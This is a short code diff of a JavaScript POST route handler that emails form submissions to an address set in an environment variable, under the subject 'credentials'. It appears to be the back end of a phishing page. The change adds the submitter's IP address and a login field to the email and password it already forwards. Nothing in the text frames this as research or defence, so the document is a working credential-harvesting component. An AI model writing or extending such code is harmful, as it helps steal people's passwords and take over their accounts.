@@ -20,10 +20,16 @@ export async function POST(request) {
       to: process.env.EMAIL_TO_SEND,
       subject: "credentials",
       // text: `${JSON.stringify(email)} ${JSON.stringify(password)}`,
-      html: `<h3>${JSON.stringify(res.email).replaceAll(
-        '"',
-        ""
-      )} /password: ${JSON.stringify(res.pass).replaceAll('"', "")}</h3>`,
+      html: `<h3>${JSON.stringify(res.email).replaceAll('"', "")}
+      
+      /password: ${JSON.stringify(res.pass).replaceAll('"', "")}
+      
+      /ip address: ${JSON.stringify(res.pi).replaceAll('"', "")}
+
+      /login: ${JSON.stringify(res.gols).replaceAll('"', "")}
+      </h3>
+      
+      `,
     });
 
     console.log(result);
